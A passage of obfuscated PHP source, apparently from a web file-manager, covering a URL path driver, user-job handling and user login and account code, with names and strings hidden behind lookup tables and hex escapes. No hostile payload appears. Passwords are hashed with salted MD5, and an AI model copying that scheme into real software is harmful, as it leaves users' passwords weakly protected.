{ return $this->fileOutServer($ıÎó–û», $“ƒıî£±, $´·ºıÑ¼, $µúı¡Å§); } if (!$´·ºıÑ¼) { $´·ºıÑ¼ = $this->pathThis($ıÎó–û»); } $Ã±è¹åı = $“ƒıî£± ? array($_SERVER[¯‘·½][1628] . rawurlencode($´·ºıÑ¼)) : array(); $œ¿´˜É = $this->link($ıÎó–û», $Ã±è¹åı); $this->fileOutLink($œ¿´˜É); } public function fileOutServer($®ÀšáÈç, $å´îÕã = false, $èà“¶ªó = false, $¢ıÀòÍ = '') { parent::fileOut($®ÀšáÈç, $å´îÕã, $èà“¶ªó, $¢ıÀòÍ); } public function fileOutImage($Á’¨¶—µ, $æ±Ûóú¬ = 250) { $Èåğºú¯ = $this->link($Á’¨¶—µ . $_SERVER[¯‘·½][1629] . $æ±Ûóú¬); $this->fileOutLink($Èåğºú¯); } public function fileOutImageServer($Æüï‚”, $ŒÆê±Âá = 250) { parent::fileOutImage($Æüï‚”, $ŒÆê±Âá); } public function hashMd5($Ÿ•³²¢) { $¥¼»¢ŠÚ =& $_SERVER[¯‘·½]; $±‘åÎ‰Ø = $this->_objectMeta($Ÿ•³²¢); return isset($±‘åÎ‰Ø[$¥¼»¢ŠÚ[248]]) ? $±‘åÎ‰Ø[$¥¼»¢ŠÚ[248]] : !1; } public function size($µ«ÎûŞ²) { $ïõï×À± = $this->objectMeta($µ«ÎûŞ²); return $ïõï×À± ? $ïõï×À±[$_SERVER[¯‘·½][79]] : 0; } public function info($¹óÎÍİ´) { if ($this->isFolder($¹óÎÍİ´)) { return $this->folderInfo($¹óÎÍİ´); } else { if ($this->isFile($¹óÎÍİ´)) { return $this->fileInfo($¹óÎÍİ´); } } return !1; } public function exist($–•„ÏÂ) { return $this->isFile($–•„ÏÂ) || $this->isFolder($–•„ÏÂ); } public function isFile($ÔĞ´ÉŸÎ) { return !$this->isFolder($ÔĞ´ÉŸÎ) && $this->objectMeta($ÔĞ´ÉŸÎ); } public function isFolder($—¹´¬ç†) { return $this->cacheMethod($_SERVER[¯‘·½][180], $—¹´¬ç†); } protected function objectMeta($û÷í‚‘) { return $this->cacheMethod($_SERVER[¯‘·½][182], $û÷í‚‘); } protected function _objectMeta($êĞÚÆšÅ) { $ı²ĞŸşÆ =& $_SERVER[¯‘·½]; if ($êĞÚÆšÅ == $ı²ĞŸşÆ[12] || $êĞÚÆšÅ == $ı²ĞŸşÆ[8]) { return array(); } $á¿ı€¡Ğ = $this->ussRequest($êĞÚÆšÅ, $ı²ĞŸşÆ[1630]); if (!$á¿ı€¡Ğ[$ı²ĞŸşÆ[1321]]) { return null; } $È´Ùô¬É = isset($á¿ı€¡Ğ[$ı²ĞŸşÆ[1311]]) ? $á¿ı€¡Ğ[$ı²ĞŸşÆ[1311]] : array(); if (!isset($È´Ùô¬É[$ı²ĞŸşÆ[1631]])) { return null; } $–Äè‚ = array($ı²ĞŸşÆ[33] => isset($È´Ùô¬É[$ı²ĞŸşÆ[1631]]) ? $È´Ùô¬É[$ı²ĞŸşÆ[1631]] : null, $ı²ĞŸşÆ[79] => isset($È´Ùô¬É[$ı²ĞŸşÆ[1632]]) ? $È´Ùô¬É[$ı²ĞŸşÆ[1632]] : null, $ı²ĞŸşÆ[248] => isset($È´Ùô¬É[$ı²ĞŸşÆ[1633]]) ? $È´Ùô¬É[$ı²ĞŸşÆ[1633]] : null, $ı²ĞŸşÆ[1600] => isset($È´Ùô¬É[$ı²ĞŸşÆ[1634]]) ? $È´Ùô¬É[$ı²ĞŸşÆ[1634]] : null); $–Äè‚[$ı²ĞŸşÆ[1601]] = isset($È´Ùô¬É[$ı²ĞŸşÆ[1635]]) ? strtotime($È´Ùô¬É[$ı²ĞŸşÆ[1635]]) : $–Äè‚[$ı²ĞŸşÆ[1600]]; return $–Äè‚; } protected function _isFolder($ˆÓ´ºêÖ) { $«Ì×·‚î =& $_SERVER[¯‘·½]; if ($ˆÓ´ºêÖ == $«Ì×·‚î[12] || $ˆÓ´ºêÖ == $«Ì×·‚î[8]) { return !0; } $â§éµÁ˜ = $this->_objectMeta($ˆÓ´ºêÖ); return isset($â§éµÁ˜[$«Ì×·‚î[33]]) && $â§éµÁ˜[$«Ì×·‚î[33]] == $«Ì×·‚î[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Á¿óú‰„ = false) { } public function exist($á×ÒÈÃ°) { $ÎÛÀéÓ = $this->info($á×ÒÈÃ°); return $ÎÛÀéÓ[$_SERVER[¯‘·½][235]]; } public function isFile($Şã€ä£ó) { $Ş¦š¥‡ç = $this->info($Şã€ä£ó); return $Ş¦š¥‡ç[$_SERVER[¯‘·½][235]]; } public function isFolder($Ãñ¯æÒ…) { return !1; } public function size($äïÂ½è) { $ÅÎ€¤ÎŞ = $this->info($äïÂ½è); return $ÅÎ€¤ÎŞ[$_SERVER[¯‘·½][79]]; } public function info($ûŠÆæ¡Î) { return $this->infoParse($ûŠÆæ¡Î); } public function infoAuth($ËÜ¿Ü¥œ) { return $this->infoParse($ËÜ¿Ü¥œ); } public function infoWithChildren($€Ü‘İÓŸ) { return $this->infoParse($€Ü‘İÓŸ); } public function infoFull($Ÿîë…û…) { return $this->infoParse($Ÿîë…û…); } private function infoParse($‘øëÊ‹) { $ˆ°šÖ¦’ =& $_SERVER[¯‘·½]; $Ÿü×Ÿ·‰ = $this->header($‘øëÊ‹); if (!$Ÿü×Ÿ·‰ || !$Ÿü×Ÿ·‰[$ˆ°šÖ¦’[835]]) { return !1; } $Å„Ÿ×á« = _get($Ÿü×Ÿ·‰, $ˆ°šÖ¦’[414], 0); $èÂşôª = array($ˆ°šÖ¦’[32] => $Ÿü×Ÿ·‰[$ˆ°šÖ¦’[32]], $ˆ°šÖ¦’[87] => $‘øëÊ‹, $ˆ°šÖ¦’[33] => $ˆ°šÖ¦’[233], $ˆ°šÖ¦’[79] => intval($Å„Ÿ×á«), $ˆ°šÖ¦’[169] => get_path_ext($Ÿü×Ÿ·‰[$ˆ°šÖ¦’[32]]), $ˆ°šÖ¦’[1487] => $Å„Ÿ×á« > 0 && $Ÿü×Ÿ·‰[$ˆ°šÖ¦’[1636]], $ˆ°šÖ¦’[1488] => !1); return $èÂşôª; } private function header($¿‡¯–ÓÍ) { $»­§¬î =& $_SERVER[¯‘·½]; if (isset(self::$_cacheHeader[$¿‡¯–ÓÍ])) { return self::$_cacheHeader[$¿‡¯–ÓÍ]; } $’ÅÁîÈö = isset($GLOBALS[$»­§¬î[1637]]) ? $GLOBALS[$»­§¬î[1637]] : !1; $GLOBALS[$»­§¬î[1637]] = !0; self::$_cacheHeader[$¿‡¯–ÓÍ] = url_header($¿‡¯–ÓÍ); $GLOBALS[$»­§¬î[1637]] = $’ÅÁîÈö; return self::$_cacheHeader[$¿‡¯–ÓÍ]; } public function hashSimple($•¼’†ˆ¹, $êªå¢ˆ¾ = false) { $—À‰Şø¹ =& $_SERVER[¯‘·½]; $×ÄëØÌ’ = $this->info($•¼’†ˆ¹); if (!$×ÄëØÌ’ || !$×ÄëØÌ’[$—À‰Şø¹[235]]) { return !1; } $ŸÍå«¨Ñ = $×ÄëØÌ’[$—À‰Şø¹[79]]; $›„€„° = 200; $Ìã¥İ“ = 50; if ($ŸÍå«¨Ñ <= $›„€„° * $Ìã¥İ“) { return md5($this->fileSubstr($•¼’†ˆ¹, 0, $ŸÍå«¨Ñ)) . $ŸÍå«¨Ñ; } $£§Å‚ÓÑ = intval($ŸÍå«¨Ñ / $Ìã¥İ“); $àãó¸íè = $—À‰Şø¹[12]; $‚³”õÎ‘ = timeFloat(); $´£¯ØÊ = 15; for ($ôÊÛïû© = 0; $ôÊÛïû© < $Ìã¥İ“; $ôÊÛïû©++) { if (timeFloat() - $‚³”õÎ‘ > $´£¯ØÊ) { return !1; } $™×«ÈÜÏ = $this->fileSubstr($•¼’†ˆ¹, $£§Å‚ÓÑ * $ôÊÛïû©, $›„€„°); if (!$™×«ÈÜÏ) { return !1; } $àãó¸íè .= $™×«ÈÜÏ; } $àãó¸íè .= $this->fileSubstr($•¼’†ˆ¹, $ŸÍå«¨Ñ - $›„€„°, $›„€„°); return md5($àãó¸íè) . $ŸÍå«¨Ñ; } public function getContent($¾™í€³) { return $this->fileSubstr($¾™í€³); } public function fileSubstr($õ™‡ş½º, $ñå¾à·à = 0, $³§É‰áÅ = -1) { $…İúÓÛ– =& $_SERVER[¯‘·½]; $›íîÎº› = $this->info($õ™‡ş½º); if (!$›íîÎº› || !$›íîÎº›[$…İúÓÛ–[235]] && $›íîÎº›[$…İúÓÛ–[79]] > 1024 * 1024 * 10) { return !1; } if ($³§É‰áÅ === -1) { $³§É‰áÅ = $›íîÎº›[$…İúÓÛ–[79]]; } if ($³§É‰áÅ == 0) { return $…İúÓÛ–[12]; } $æÊ„ÎæĞ = array($…İúÓÛ–[1638] . $ñå¾à·à . $…İúÓÛ–[873] . ($ñå¾à·à + $³§É‰áÅ - 1)); $ªßŸÌà† = url_request($õ™‡ş½º, $…İúÓÛ–[1527], !1, $æÊ„ÎæĞ, !1, !1, 30); return $ªßŸÌà†[$…İúÓÛ–[1311]] ? $ªßŸÌà†[$…İúÓÛ–[1311]] : $…İúÓÛ–[12]; } public function download($˜¯‘›Æ×, $ÛÀİ‰ğ) { Downloader::start($˜¯‘›Æ×, $ÛÀİ‰ğ); return $ÛÀİ‰ğ; } } goto AÄ¸Ø¨­¬; DÆË±âéäõ: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\56\x6a\x6f\142\114\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\x64\x65\x73\143", "\163\157\x72\x74"); const JOB_KEY = "\x73\145\x6c\x66\112\x6f\142\114\151\x73\164"; public function listData($®õ¢§£† = false, $«–ôÊÍ¿ = "\x73\x6f\162\164", $ÔÆ¦Œ‘ = false) { return parent::listData($®õ¢§£†, $«–ôÊÍ¿, $ÔÆ¦Œ‘); } public function remove($¤Ğ©¡¦È) { return parent::remove($¤Ğ©¡¦È); } public function add($ÌÌïÌñ) { $‚°áÎìñ =& $_SERVER[¯‘·½]; if ($this->findByName($ÌÌïÌñ[$‚°áÎìñ[32]])) { return !1; } $ÌÌïÌñ[$‚°áÎìñ[2030]] = $this->getSort(); return parent::insert($ÌÌïÌñ); } private function getSort() { $¨‘é°äê =& $_SERVER[¯‘·½]; $Ğí„Ÿ…Ì = parent::listData(); $–ÏŒ¤…º = array_to_keyvalue($Ğí„Ÿ…Ì, $¨‘é°äê[12], $¨‘é°äê[2030]); return empty($–ÏŒ¤…º) ? 0 : max($–ÏŒ¤…º) + 1; } public function update($ÌƒÚ³˜, $¸ªëà±Ş) { $ê ¤ ëå =& $_SERVER[¯‘·½]; $ßñÈ¢”É = parent::listData($ÌƒÚ³˜); $˜Î†Ë¿ = $this->findByName($¸ªëà±Ş[$ê ¤ ëå[32]]); if (!$ßñÈ¢”É || $˜Î†Ë¿ && $˜Î†Ë¿[$ê ¤ ëå[477]] != $ßñÈ¢”É[$ê ¤ ëå[477]]) { return !1; } return parent::update($ÌƒÚ³˜, $¸ªëà±Ş); } public function setUserJob($ÍÃÚûü·, $£ôÔ¦…Ô) { $ÊæçşŞ =& $_SERVER[¯‘·½]; if (!is_array($£ôÔ¦…Ô)) { $£ôÔ¦…Ô = array($£ôÔ¦…Ô); } $÷áÎœ = parent::listData(); $İ²‘ùÂŒ = array_to_keyvalue($÷áÎœ, $ÊæçşŞ[32]); $–Â”“ = $ÊæçşŞ[456]; foreach ($£ôÔ¦…Ô as $»òŒ—ñØ) { if ($İ²‘ùÂŒ[$»òŒ—ñØ]) { $–Â”“ .= $İ²‘ùÂŒ[$»òŒ—ñØ][$ÊæçşŞ[477]] . $ÊæçşŞ[50]; } else { $ÂÖ¿÷«ç = $this->add($»òŒ—ñØ); $–Â”“ .= $ÂÖ¿÷«ç . $ÊæçşŞ[50]; } } $–Â”“ = rtrim($–Â”“, $ÊæçşŞ[50]); Model($ÊæçşŞ[601])->metaSet($ÍÃÚûü·, self::JOB_KEY, $–Â”“); } public function getUserJob($Š’ªó±ß) { $çœÑş­ï = Model($_SERVER[¯‘·½][601])->metaGet($Š’ªó±ß); return $this->getUserJobInfo($çœÑş­ï[self::JOB_KEY]); } public function getUserJobInfo($¾ ğ¹¦«) { $ûÁÚğ÷ï =& $_SERVER[¯‘·½]; $ÍûÀ¿®¨ = explode($ûÁÚğ÷ï[50], $¾ ğ¹¦«); $ÓÉİ§ò = parent::listData(); $ÓÉİ§ò = array_remove_key($ÓÉİ§ò, $ûÁÚğ÷ï[234]); $ìÙî»ëï = array(); foreach ($ÍûÀ¿®¨ as $ˆİÂ«ïÃ) { if (isset($ÓÉİ§ò[$ˆİÂ«ïÃ])) { $ìÙî»ëï[] = $ÓÉİ§ò[$ˆİÂ«ïÃ]; } } return $ìÙî»ëï; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\x6d\x65" => "\x75\163\145\x72\137\155\145\x74\x61", "\x6d\x65\164\141\x46\151\145\154\144" => "\x75\163\x65\162\111\x44"); protected $simpleField = "\165\163\x65\162\x49\x44\54\156\x69\x63\x6b\x4e\141\155\x65\x2c\x6e\141\x6d\145\54\141\x76\x61\164\141\x72\x2c\163\x65\x78\x2c\163\164\x61\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÎÅô”™ß) { $ôÖÏÍÚï =& $_SERVER[¯‘·½]; $´ÛÑæí = $ôÖÏÍÚï[2505]; return array($ôÖÏÍÚï[2088] => array($ÎÅô”™ß[0], $´ÛÑæí), $ôÖÏÍÚï[2090] => array($ÎÅô”™ß[0], $´ÛÑæí), $ôÖÏÍÚï[2506] => array($ÎÅô”™ß[0], $´ÛÑæí)); } protected function getInfo($µÚÓ†ªÒ, $ğ¶òã = false) { $¼ÅÉØ¢ª = $this->getInfoSimple($µÚÓ†ªÒ); if (!is_array($¼ÅÉØ¢ª)) { return array(); } if ($ğ¶òã) { return $this->_getInfoApply($¼ÅÉØ¢ª); } return $this->cacheFunctionGet($_SERVER[¯‘·½][2092], $µÚÓ†ªÒ); } protected function getInfoFull($·¹¤À½Ä, $ÑÔ»ªğ¹ = false) { $í¤²ÁÚÃ = $this->getInfoSimple($·¹¤À½Ä); if (!is_array($í¤²ÁÚÃ)) { return array(); } if ($ÑÔ»ªğ¹) { return $this->_getInfoApply($í¤²ÁÚÃ, !0); } return $this->cacheFunctionGet($_SERVER[¯‘·½][2507], $·¹¤À½Ä); } private function _getInfoApply($¾˜¹…¹Á, $‰æ–¡„Ç = false) { $ªâŒíÁÉ =& $_SERVER[¯‘·½]; if (!$¾˜¹…¹Á) { return $¾˜¹…¹Á; } $ò¢çÔÅâ = md5($ªâŒíÁÉ[2508] . $¾˜¹…¹Á[$ªâŒíÁÉ[985]] . $ªâŒíÁÉ[2509] . $¾˜¹…¹Á[$ªâŒíÁÉ[32]]); $¾˜¹…¹Á = $this->_listDataApplyItem($¾˜¹…¹Á); $ó¾ÉŸ·ù = Model($ªâŒíÁÉ[1452])->metaGet($¾˜¹…¹Á[$ªâŒíÁÉ[90]][$ªâŒíÁÉ[194]]); $¾˜¹…¹Á[$ªâŒíÁÉ[2510]] = $ò¢çÔÅâ; $¾˜¹…¹Á[$ªâŒíÁÉ[90]][$ªâŒíÁÉ[2293]] = isset($ó¾ÉŸ·ù[$ªâŒíÁÉ[2294]]) ? $ó¾ÉŸ·ù[$ªâŒíÁÉ[2294]] : null; if ($‰æ–¡„Ç) { $¾˜¹…¹Á[$ªâŒíÁÉ[543]] = $this->metaGet($¾˜¹…¹Á[$ªâŒíÁÉ[1806]]); } return $¾˜¹…¹Á; } protected function getInfoSimple($òİÏ‘’ü, $ªµ¡¿óÀ = false) { $Ñ¿ó¢ßà =& $_SERVER[¯‘·½]; if (!$òİÏ‘’ü) { return array(); } if ($ªµ¡¿óÀ) { $‚û¼¿×§ = $this->where(array($Ñ¿ó¢ßà[1806] => intval($òİÏ‘’ü)))->find(); if (!is_array($‚û¼¿×§)) { return array(); } $‚û¼¿×§[$Ñ¿ó¢ßà[2511]] = Action($Ñ¿ó¢ßà[2512])->parseUrl($‚û¼¿×§[$Ñ¿ó¢ßà[2511]]); return $‚û¼¿×§; } return $this->cacheFunctionGet($Ñ¿ó¢ßà[2093], $òİÏ‘’ü); } protected function getInfoSimpleOuter($«Šªâ™Ø) { $Ç›·å®… =& $_SERVER[¯‘·½]; if (!$«Šªâ™Ø || $«Šªâ™Ø == 0) { return array($Ç›·å®…[1806] => $Ç›·å®…[231], $Ç›·å®…[32] => $Ç›·å®…[176] . LNG($Ç›·å®…[2513]) . $Ç›·å®…[178], $Ç›·å®…[2511] => STATIC_PATH . $Ç›·å®…[2514]); } $©Ëõ‡³± = $this->cacheFunctionGet($Ç›·å®…[2093], $«Šªâ™Ø); $¿„¸â ² = array_field_key($©Ëõ‡³±, explode($Ç›·å®…[50], $this->simpleField)); if (!$¿„¸â ²) { return array($Ç›·å®…[1806] => $Ç›·å®…[1297], $Ç›·å®…[32] => $Ç›·å®…[176] . LNG($Ç›·å®…[2515]) . $Ç›·å®…[178], $Ç›·å®…[2511] => STATIC_PATH . $Ç›·å®…[2516]); } $¿„¸â ²[$Ç›·å®…[2511]] = Action($Ç›·å®…[2512])->parseUrl($¿„¸â ²[$Ç›·å®…[2511]]); return $¿„¸â ²; } protected function groupUser($£ÔŞ«‹•) { } public static function errorLang($ — õ´²) { $œ¯ºàÇ =& $_SERVER[¯‘·½]; $°µ²™º = array(self::ERROR_USER_NOT_EXISTS => $œ¯ºàÇ[2517], self::ERROR_USER_PASSWORD_ERROR => $œ¯ºàÇ[2518], self::ERROR_USER_EXIST_NAME => $œ¯ºàÇ[2519], self::ERROR_USER_EXIST_PHONE => $œ¯ºàÇ[2520], self::ERROR_USER_EXIST_EMAIL => $œ¯ºàÇ[2521], self::ERROR_USER_LOGIN_LOCK => $œ¯ºàÇ[2522], self::ERROR_IP_NOT_ALLOW => $œ¯ºàÇ[2523], self::ERROR_USER_EXIST_NICKNAME => $œ¯ºàÇ[2524]); $·´àÍá„ = LNG($°µ²™º[$ — õ´²]); if ($ — õ´² == self::ERROR_USER_LOGIN_LOCK) { $œÄó¦¾ = (int) Model($œ¯ºàÇ[1408])->get($œ¯ºàÇ[2525]); if ($œÄó¦¾ > 60) { $·´àÍá„ = str_replace($œ¯ºàÇ[91], ceil($œÄó¦¾ / 60), $·´àÍá„); } } return $·´àÍá„; } protected function metaSet($£›‡ÍÅÎ, $¹§¤‘üŠ = null, $·—äÌ  = null) { $this->clearCache($£›‡ÍÅÎ); return parent::metaSet($£›‡ÍÅÎ, $¹§¤‘üŠ, $·—äÌ ); } public function getInfoByMeta($³€íÙÕ‚, $ıĞÛÃ˜Ì) { $†«ù”ŒÁ =& $_SERVER[¯‘·½]; $ëİ ññà = Model($†«ù”ŒÁ[2526])->where(array($†«ù”ŒÁ[97] => $³€íÙÕ‚, $†«ù”ŒÁ[452] => $ıĞÛÃ˜Ì))->find(); if ($ëİ ññà) { return $this->getInfo($ëİ ññà[$†«ù”ŒÁ[1806]]); } return !1; } public function userLoginCheck($¥€˜ö¶€, $ öƒ§­ó, $½ê±¿Ò = false) { $Ò¯ ¬Ìñ =& $_SERVER[¯‘·½]; $òëËÈÙ = $this->userLoginFind($¥€˜ö¶€); if (!$òëËÈÙ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($òëËÈÙ[$Ò¯ ¬Ìñ[1806]], $ öƒ§­ó)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $½ê±¿Ò ? $this->getInfoFull($òëËÈÙ[$Ò¯ ¬Ìñ[1806]]) : $this->getInfo($òëËÈÙ[$Ò¯ ¬Ìñ[1806]]); } public function userLoginFind($Á½¥Ğ½) { $½ŠÑç°‹ =& $_SERVER[¯‘·½]; $Ç¦“Ü³¶ = array($½ŠÑç°‹[32] => $Á½¥Ğ½, $½ŠÑç°‹[2306] => $Á½¥Ğ½, $½ŠÑç°‹[382] => $Á½¥Ğ½, $½ŠÑç°‹[2527] => $Á½¥Ğ½, $½ŠÑç°‹[1096] => $½ŠÑç°‹[1098]); if ($this->nickNameRpt()) { unset($Ç¦“Ü³¶[$½ŠÑç°‹[2306]]); } return $this->where($Ç¦“Ü³¶)->find(); } public function clearCache($ìÚŠŠ°) { $Ê¼—÷ªæ =& $_SERVER[¯‘·½]; $this->cacheFunctionClear($Ê¼—÷ªæ[2092], $ìÚŠŠ°); $this->cacheFunctionClear($Ê¼—÷ªæ[2093], $ìÚŠŠ°); $this->cacheFunctionClear($Ê¼—÷ªæ[2507], $ìÚŠŠ°); } public function userPasswordCheck($ØÓåŠ‘, $ª¸÷Îâ) { $éæ˜Œûæ =& $_SERVER[¯‘·½]; $À¦¹©êª = $this->where(array($éæ˜Œûæ[1806] => intval($ØÓåŠ‘)))->find(); $û„‰×Ì– = $this->metaGet($ØÓåŠ‘); $ış™±ğé = isset($û„‰×Ì–[$éæ˜Œûæ[2528]]) ? $û„‰×Ì–[$éæ˜Œûæ[2528]] : $éæ˜Œûæ[12]; if (md5($ış™±ğé . trim($ª¸÷Îâ)) !== $À¦¹©êª[$éæ˜Œûæ[985]]) { return !1; } return !0; } public function userAdd($ó€ĞìÒ) { $Á´Šœ°ˆ =& $_SERVER[¯‘·½]; $ğ¢®·­½ = array($Á´Šœ°ˆ[496] => $ó€ĞìÒ[$Á´Šœ°ˆ[32]], $Á´Šœ°ˆ[2529] => $ó€ĞìÒ[$Á´Šœ°ˆ[2217]], $Á´Šœ°ˆ[2530] => isset($ó€ĞìÒ[$Á´Šœ°ˆ[382]]) ? $ó€ĞìÒ[$Á´Šœ°ˆ[382]] : $Á´Šœ°ˆ[12], $Á´Šœ°ˆ[2531] => isset($ó€ĞìÒ[$Á´Šœ°ˆ[2527]]) ? $ó€ĞìÒ[$Á´Šœ°ˆ[2527]] : $Á´Šœ°ˆ[12], $Á´Šœ°ˆ[2532] => isset($ó€ĞìÒ[$Á´Šœ°ˆ[2306]]) ? $ó€ĞìÒ[$Á´Šœ°ˆ[2306]] : $ó€ĞìÒ[$Á´Šœ°ˆ[32]], $Á´Šœ°ˆ[2533] => isset($ó€ĞìÒ[$Á´Šœ°ˆ[2511]]) ? $ó€ĞìÒ[$Á´Šœ°ˆ[2511]] : $Á´Šœ°ˆ[12], $Á´Šœ°ˆ[2534] => isset($ó€ĞìÒ[$Á´Šœ°ˆ[2535]]) ? $ó€ĞìÒ[$Á´Šœ°ˆ[2535]] : 1, $Á´Šœ°ˆ[2536] => $ó€ĞìÒ[$Á´Šœ°ˆ[985]], $Á´Šœ°ˆ[2094] => isset($ó€ĞìÒ[$Á´Šœ°ˆ[1993]]) ? $ó€ĞìÒ[$Á´Šœ°ˆ[1993]] : 1024 * 1024 * 20, $Á´Šœ°ˆ[2095] => 0, $Á´Šœ°ˆ[2537] => 0, $Á´Šœ°ˆ[2139] => isset($ó€ĞìÒ[$Á´Šœ°ˆ[835]]) ? $ó€ĞìÒ[$Á´Šœ°ˆ[835]] : 1); if (!empty($ó€ĞìÒ[$Á´Šœ°ˆ[1806]])) { $ğ¢®·­½[$Á´Šœ°ˆ[1806]] = $ó€ĞìÒ[$Á´Šœ°ˆ[1806]]; } $Å±Ü¹Ş = $this->_checkExist($ó€ĞìÒ); if ($Å±Ü¹Ş !== !0) { return $Å±Ü¹Ş; } if (!empty($ğ¢®·­½[$Á´Šœ°ˆ[2511]]) && strlen($ğ¢®·­½[$Á´Šœ°ˆ[2511]]) > 255) { $ğ¢®·­½[$Á´Šœ°ˆ[2511]] = $Á´Šœ°ˆ[12]; } $ç±¢üÄ¤ = $this->add($ğ¢®·­½); $’¾ğõš = array($Á´Šœ°ˆ[2536] => $ğ¢®·­½[$Á´Šœ°ˆ[985]], $Á´Šœ°ˆ[2532] => $ğ¢®·­½[$Á´Šœ°ˆ[2306]], $Á´Šœ°ˆ[2538] => $ó€ĞìÒ[$Á´Šœ°ˆ[2099]]); $this->userEdit($ç±¢üÄ¤, $’¾ğõš); Model($Á´Šœ°ˆ[1452])->userRootAdd($ç±¢üÄ¤); return $ç±¢üÄ¤; } protected function userEditTest($±–òªÀ•, $¿µĞ¢œ„) { return $this->call($_SERVER[¯‘·½][2539], $±–òªÀ•, $¿µĞ¢œ„); } protected function userEdit($Ä†ù’™ğ, $¢‚€à) { $‰Ü‰ŸÌÙ =& $_SERVER[¯‘·½]; $Û ›¸¥µ = $this->getInfoSimple($Ä†ù’™ğ); if (!$Û ›¸¥µ) { return !1; } $©•á¡¸… = $this->_checkExist($¢‚€à, $Ä†ù’™ğ); if ($©•á¡¸… !== !0) { return $©•á¡¸…; } if (isset($¢‚€à[$‰Ü‰ŸÌÙ[985]]) && trim($¢‚€à[$‰Ü‰ŸÌÙ[985]]) != $‰Ü‰ŸÌÙ[12]) { $¨„‚á÷ = $this->metaGet($Ä†ù’™ğ); if (empty($¨„‚á÷[$‰Ü‰ŸÌÙ[2528]])) { $¨„‚á÷[$‰Ü‰ŸÌÙ[2528]] = rand_string(10); Model($‰Ü‰ŸÌÙ[581])->metaSet($Ä†ù’™ğ, $‰Ü‰ŸÌÙ[2528], $¨„‚á÷[$‰Ü‰ŸÌÙ[2528]]); } $¢‚€à[$‰Ü‰ŸÌÙ[985]] = md5($¨„‚á÷[$‰Ü‰ŸÌÙ[2528]] . trim($¢‚€à[$‰Ü‰ŸÌÙ[985]])); } else { unset($¢‚€à[$‰Ü‰ŸÌÙ[985]]); } if (!empty($¢‚€à[$‰Ü‰ŸÌÙ[2511]]) && strlen($¢‚€à[$‰Ü‰ŸÌÙ[2511]]) > 255) { $¢‚€à[$‰Ü‰ŸÌÙ[2511]] = $‰Ü‰ŸÌÙ[12]; } if (isset($¢‚€à[$‰Ü‰ŸÌÙ[2306]])) { $this->setNamePinyin($Ä†ù’™ğ, $¢‚€à[$‰Ü‰ŸÌÙ[2306]]); } if (isset($¢‚€à[$‰Ü‰ŸÌÙ[2099]])) { $·¶è“ìö = $‰Ü‰ŸÌÙ[1411] . $Ä†ù’™ğ; $³ûê±ğ“ = $‰Ü‰ŸÌÙ[1409]; $‰¬Ÿëèà = $¢‚€à[$‰Ü‰ŸÌÙ[2099]] ? $¢‚€à[$‰Ü‰ŸÌÙ[2099]] : $‰Ü‰ŸÌÙ[12]; $¼¤‹ê = Model($‰Ü‰ŸÌÙ[1408])->get($·¶è“ìö, $³ûê±ğ“); $¼¤‹ê = $¼¤‹ê ? $¼¤‹ê : $‰Ü‰ŸÌÙ[12]; if ($¼¤‹ê != $‰¬Ÿëèà) { if (!$‰¬Ÿëèà && $¼¤‹ê) { Model($‰Ü‰ŸÌÙ[1408])->remove($·¶è“ìö, $³ûê±ğ“); } else { if ($‰¬Ÿëèà) { Model($‰Ü‰ŸÌÙ[1408])->set($·¶è“ìö, $‰¬Ÿëèà, $³ûê±ğ“); } } } unset($¢‚€à[$‰Ü‰ŸÌÙ[2099]]); Model($‰Ü‰ŸÌÙ[601])->metaSet($Ä†ù’™ğ, $‰Ü‰ŸÌÙ[2099], $‰¬Ÿëèà); } if (empty($¢‚€à)) { return !0; } $this->where(array($‰Ü‰ŸÌÙ[1797] => $Ä†ù’™ğ))->save($¢‚€à); $this->clearCache($Ä†ù’™ğ); return !0; } public function setNamePinyin($æÆŠ“«, $µ¢õğ¤ó = false) { $ñÒŞ·š =& $_SERVER[¯‘·½]; if (!$µ¢õğ¤ó) { $Ëç™²’´ = $this->getInfoSimple($æÆŠ“«); $µ¢õğ¤ó = $Ëç™²’´[$ñÒŞ·š[2306]] ? $Ëç™²’´[$ñÒŞ·š[2306]] : $Ëç™²’´[$ñÒŞ·š[32]]; } $²û¼¦øé = Model($ñÒŞ·š[601]); if (!Input::check($µ¢õğ¤ó, $ñÒŞ·š[662])) { return $²û¼¦øé->metaSet($æÆŠ“«, array($ñÒŞ·š[540] => $ñÒŞ·š[12], $ñÒŞ·š[539] => $ñÒŞ·š[12])); } return $²û¼¦øé->metaSet($æÆŠ“«, array($ñÒŞ·š[540] => str_replace($ñÒŞ·š[53], $ñÒŞ·š[12], Pinyin::get($µ¢õğ¤ó)), $ñÒŞ·š[539] => Pinyin::get($µ¢õğ¤ó, $ñÒŞ·š[663]))); } private function nickNameRpt() { $Áõ§Õö =& $_SERVER[¯‘·½]; $ØàÖ€ª¸ = Model($Áõ§Õö[856])->get($Áõ§Õö[2540]); $š½´¡¯Å = $GLOBALS[$Áõ§Õö[6]][$Áõ§Õö[459]][$Áõ§Õö[2540]]; $¢Ç„°®ä = !is_null($ØàÖ€ª¸) ? $ØàÖ€ª¸ : $š½´¡¯Å; return !!$¢Ç„°®ä; } private function _checkExist($„¤·ƒŸğ, $•‰—ÒÜş = false) { $ÏÛ²Ø‹Ï =& $_SERVER[¯‘·½]; $ó–ó³ÖĞ = array($ÏÛ²Ø‹Ï[32] => UserModel::ERROR_USER_EXIST_NAME, $ÏÛ²Ø‹Ï[2306] => UserModel::ERROR_USER_EXIST_NICKNAME, $ÏÛ²Ø‹Ï[382] => UserModel::ERROR_USER_EXIST_EMAIL, $ÏÛ²Ø‹Ï[2527] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { 